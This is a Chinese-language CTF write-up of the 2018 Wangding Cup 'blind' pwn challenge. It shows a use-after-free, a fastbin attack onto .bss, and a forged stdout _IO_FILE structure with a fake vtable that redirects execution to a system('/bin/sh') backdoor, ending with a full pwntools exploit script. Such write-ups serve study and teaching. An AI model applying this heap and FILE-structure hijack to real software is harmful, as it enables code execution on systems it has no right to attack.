# 2018网鼎杯--pwn--blind

题目有三个功能 new change  release 没有提供show，是真瞎啊，瞎子退团吧，我奶不动你

```
1.new
2.change
3.release
4.exit

```

checksec：

```
	Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

没开pie。

打开ida查看：

```c++
unsigned __int64 newnote()
{
  unsigned int v1; // [rsp+Ch] [rbp-24h]
  char s; // [rsp+10h] [rbp-20h]
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index:");
  memset(&s, 0, 0x10uLL);
  read(0, &s, 0xFuLL);
  v1 = atoi(&s);
  if ( v1 <= 5 && !ptr[v1] )                    // 新建不超过6个
  {
    ptr[v1] = malloc(0x68uLL);                  // 固定大小为0x68
    printf("Content:", &s);
    sub_400932((__int64)ptr[v1], 0x68u);        // 输入范围再0x68以内
    puts("Done!");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

```c++
unsigned __int64 release()
{
  unsigned int v1; // [rsp+Ch] [rbp-24h]
  char s; // [rsp+10h] [rbp-20h]
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index:");
  memset(&s, 0, 0x10uLL);
  read(0, &s, 0xFuLL);
  v1 = atoi(&s);
  if ( v1 <= 5 && ptr[v1] && dword_602098 <= 2 )
  {
    free(ptr[v1]);
    ++dword_602098;                             // 指针没清空
    puts("Done!");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

可见release没有把指针清空，存在uaf，且块不能新建超过6块，每块规定大小为0x68。

除此之外，我们还发现system的函数。

```c++
int sub_4008E3()
{
  return system("/bin/sh");
}
```



## 利用思路

- 通过uaf拿到bss段地址

- 修改存放在bss上的file指针

  新知识：伪造_IO_FILE结构体

  由于可以在bss段上任意写，所以修改ptr为bss地址，并在bss上伪造stdout的_IO_FILE结构体并伪造一个vtable将原本printf的虚表地址变成后门地址，让stdout地址指向这个结构体，当调用到vtable就可以执行后门函数

  我们平常在应用程序中调用fclose、fputs这些函数的时候系统最终都会通过_IO_jump_t这个函数表指针对函数进行调用（如fclose会调用close函数等）。

  在知道了这一点后，试想如果我们想办法利用其他各种溢出方式覆了应用程序的文件指针，使其指向我们可控区域，在该区域伪造相应的_IO_FILE_plus头（主要是_IO_jump_t表或者是表中函数的指针），最终在程序调用fclose函数或其它函数的时候，就可以控制程序去执行我们想要它执行的地址，control the eip, control the world。

  比较常见的是利用strcpy，strcat等覆盖了文件指针然后进一步利用。

  (参照https://www.anquanke.com/post/id/84987)

### 第一步  修改ptr为bss，达到地址任意写

利用uaf，fastbin attack使fd指向bss，我们要稍微偏移一下

```
	gdb-peda$ x/30gx 0x602010
    0x602010:	0x0000000000000000	0x0000000000000000
    0x602020 <stdout>:	0x00007f0bb54b4620	0x0000000000000000
    0x602030 <stdin>:	0x00007f0bb54b38e0	0x0000000000000000
    0x602040 <stderr>:	0x00007f0bb54b4540	0x0000000000000000
    0x602050:	0x0000000000000000	0x0000000000000000
    0x602060:	0x0000000001c08010	0x0000000001c08080
    0x602070:	0x0000000001c080f0	0x0000000000000000
    0x602080:	0x0000000000000000	0x0000000000000000
    0x602090:	0x0000000000000000	0x0000000000000002
    0x6020a0:	0x0000000000000000	0x0000000000000000
```

```
    gdb-peda$ x/30gx 0x60201d
    0x60201d:	0x0bb54b4620000000	0x000000000000007f
    0x60202d:	0x0bb54b38e0000000	0x000000000000007f
    0x60203d:	0x0bb54b4540000000	0x000000000000007f
    0x60204d:	0x0000000000000000	0x0000000000000000
    0x60205d:	0x0001c08010000000	0x0001c08080000000
```

把ptr指向bss地址，从而达到任意写

```
gdb-peda$ x/30gx 0x602010
0x602010:	0x0000000000000000	0x0000000000000000
0x602020 <stdout>:	0x00007fa7a914b620	0x6161610000000000
0x602030 <stdin>:	0x6161616161616161	0x6161616161616161
0x602040 <stderr>:	0x6161616161616161	0x6161616161616161
0x602050:	0x6161616161616161	0x6161616161616161
0x602060:	0x0000000000602020	0x0000000000602090
0x602070:	0x00000000006020f8	0x0000000000602160
0x602080:	0x00000000006021c8	0x0000000000000000
0x602090:	0x0000000000000000	0x0000000000000002
0x6020a0:	0x0000000000000000	0x0000000000000000
```

### 第二步 在bss上伪造stdout的_IO_FILE结构体

```
gdb-peda$ p *stdout
  $1 = {
_flags = 0xfbad2887, 
_IO_read_ptr = 0x7f0bb54b46a3 <_IO_2_1_stdout_+131> "\n", 
_IO_read_end = 0x7f0bb54b46a3 <_IO_2_1_stdout_+131> "\n", 
_IO_read_base = 0x7f0bb54b46a3 <_IO_2_1_stdout_+131> "\n", 
_IO_write_base = 0x7f0bb54b46a3 <_IO_2_1_stdout_+131> "\n", 
_IO_write_ptr = 0x7f0bb54b46a3 <_IO_2_1_stdout_+131> "\n", 
_IO_write_end = 0x7f0bb54b46a3 <_IO_2_1_stdout_+131> "\n", 
_IO_buf_base = 0x7f0bb54b46a3 <_IO_2_1_stdout_+131> "\n", 
_IO_buf_end = 0x7f0bb54b46a4 <_IO_2_1_stdout_+132> "", 
_IO_save_base = 0x0, 
_IO_backup_base = 0x0, 
_IO_save_end = 0x0, 
_markers = 0x0, 
_chain = 0x7f0bb54b38e0 <_IO_2_1_stdin_>, 
_fileno = 0x1, 
_flags2 = 0x0, 
_old_offset = 0xffffffffffffffff, 
_cur_column = 0x0, 
_vtable_offset = 0x0, 
_shortbuf = "\n", 
_lock = 0x7f0bb54b5780 <_IO_stdfile_1_lock>, 
_offset = 0xffffffffffffffff, 
_codecvt = 0x0, 
_wide_data = 0x7f0bb54b37a0 <_IO_wide_data_1>, 
_freeres_list = 0x0, 
_freeres_buf = 0x0, 
__pad5 = 0x0, 
_mode = 0xffffffff, 
_unused2 = '\000' <repeats 19 times>
}
```

伪造的时候flag要更改，要绕过两个校验，可以ida查看一下libc的vprintf函数实现过程那里

flag要满足

```
flag&8 = 0 and flag &2 =0 and flag & 0x8000 != 0
```

所以flag可以有很多值，例如0xfbad8080，0xfbad8000等

```python
#fake _IO_FILE
#index1
payload = p64(0x00000000fbad8000) + p64(0x602060)*7 
payload += p64(0x602061) + p64(0)*4  
change(1,payload)

#index2
payload = p64(0x602060) + p64(0x1) + p64(0xffffffffffffffff) + p64(0) 
payload += p64(0x602060) + p64(0xffffffffffffffff) + p64(0) + p64(0x602060) 
payload += p64(0)*3 + p64(0x00000000ffffffff) + p64(0)
change(2,payload)

#index3 
payload =  p64(0) + p64(0x602090 + 0x68*3) + '\n'
change(3,payload)

#fake vtable
#index 4
payload = 'a'*56 + p64(system_addr) + '\n'
change(4,payload)

```

我们伪造的_IO_FILE如下

```
0x602090:	0x00000000fbad8000	0x0000000000602060
0x6020a0:	0x0000000000602060	0x0000000000602060
0x6020b0:	0x0000000000602060	0x0000000000602060
0x6020c0:	0x0000000000602060	0x0000000000602060
0x6020d0:	0x0000000000602061	0x0000000000000000
0x6020e0:	0x0000000000000000	0x0000000000000000
0x6020f0:	0x0000000000000000	0x0000000000602060
0x602100:	0x0000000000000001	0xffffffffffffffff
0x602110:	0x0000000000000000	0x0000000000602060
0x602120:	0xffffffffffffffff	0x0000000000000000
0x602130:	0x0000000000602060	0x0000000000000000
0x602140:	0x0000000000000000	0x0000000000000000
0x602150:	0x00000000ffffffff	0x0000000000000000
0x602160:	0x0000000000000000	0x00000000006021c8
0x602170:	0x0000000000000000	0x0000000000000000
0x602180:	0x0000000000000000	0x0000000000000000
0x602190:	0x0000000000000000	0x0000000000000000
0x6021a0:	0x0000000000000000	0x0000000000000000
0x6021b0:	0x0000000000000000	0x0000000000000000
0x6021c0:	0x0000000000000000	0x6161616161616161
0x6021d0:	0x6161616161616161	0x6161616161616161
0x6021e0:	0x6161616161616161	0x6161616161616161
0x6021f0:	0x6161616161616161	0x6161616161616161
0x602200:	0x6161616161616161	0x6161616161616161
0x602210:	0x6161616161616161	0x08e3616161616161
0x602220:	0x0000000000000040	0x0000000000000000
0x602230:	0x0000000000000000	0x0000000000000000
```

直观点，就是这样

```
$1 = {
_flags = 0xfbad8000, 
_IO_read_ptr = 0x602060 <_IO_2_1_stdout_+131> "\n", 
_IO_read_end = 0x602060 <_IO_2_1_stdout_+131> "\n", 
_IO_read_base = 0x602060 <_IO_2_1_stdout_+131> "\n", 
_IO_write_base = 0x602060 <_IO_2_1_stdout_+131> "\n", 
_IO_write_ptr = 0x602060 <_IO_2_1_stdout_+131> "\n", 
_IO_write_end = 0x602060 <_IO_2_1_stdout_+131> "\n", 
_IO_buf_base = 0x602060 <_IO_2_1_stdout_+131> "\n", 
_IO_buf_end = 0x602061 <_IO_2_1_stdout_+132> "", 
_IO_save_base = 0x0, 
_IO_backup_base = 0x0, 
_IO_save_end = 0x0, 
_markers = 0x0, 
_chain = 0x602060 <_IO_2_1_stdin_>, 
_fileno = 0x1, 
_flags2 = 0x0, 
_old_offset = 0xffffffffffffffff, 
_cur_column = 0x0, 
_vtable_offset = 0x0, 
_shortbuf = "\n", 
_lock = 0x602060 <_IO_stdfile_1_lock>, 
_offset = 0xffffffffffffffff, 
_codecvt = 0x0, 
_wide_data = 0x602060 <_IO_wide_data_1>, 
_freeres_list = 0x0, 
_freeres_buf = 0x0, 
__pad5 = 0x0, 
_mode = 0xffffffff, 
_unused2 = '\000' <repeats 19 times>
}
self._offset = 0
self._codecvt = 0
self._wide_data = 0
self._freeres_list = 0
self._freeres_buf = 0
self.__pad5 = 0
self._mode = 0
self._unused2 = [0 for i in range(15 * 4 - 5 * _BITS / 8)]
self.vtable = 0x6021c8   <<<<-----chunk4
```

最后，把stdout的指针指向0x602090

```python
payload = p64(0x602090) + '\n'
change(0,payload)
```

exp:

```python
from pwn import *
context.log_level = 'debug'
p = process('./blind.')

def new(index,content):
    p.recvuntil('Choice:')
    p.sendline('1')
    p.recvuntil('Index:')
    p.sendline(str(index))
    p.recvuntil('Content:')
    p.sendline(content)

def change(index,content):
    p.recvuntil('Choice:')
    p.sendline('2')
    p.recvuntil('Index:')
    p.sendline(str(index))
    p.recvuntil('Content:')
    p.send(content)

def release(index):
    p.recvuntil('Choice:')
    p.sendline('3')
    p.recvuntil('Index:')
    p.sendline(str(index))


new(0,'aaaa')
new(1,'bbbb')
new(2,'cccc')

release(0)
release(1)
change(1,p64(0x60201d) + '\n') #1 --> 0

#gdb.attach(p)
new(3,'aaaa')
system_addr = 0x00000000004008E3
payload = 'aaa' + 'a'*0x30
payload += p64(0x602020) + p64(0x602090) + p64(0x602090 + 0x68) 
payload += p64(0x602090 + 0x68*2) + p64(0x602090 + 0x68*3)
new(4,payload)


#fake _IO_FILE
#index1
payload = p64(0x00000000fbad8000) + p64(0x602060)*7 
payload += p64(0x602061) + p64(0)*4  
change(1,payload)

#index2
payload = p64(0x602060) + p64(0x1) + p64(0xffffffffffffffff) + p64(0) 
payload += p64(0x602060) + p64(0xffffffffffffffff) + p64(0) + p64(0x602060) 
payload += p64(0)*3 + p64(0x00000000ffffffff) + p64(0)
change(2,payload)

#index3 
payload =  p64(0) + p64(0x602090 + 0x68*3) + '\n'
change(3,payload)

#fake vtable
#index 4
payload = 'a'*56 + p64(system_addr) + '\n'
change(4,payload)

#modify stdout --> fake _IO_FILE
#index 0
payload = p64(0x602090) + '\n'
change(0,payload)

p.interactive()
```

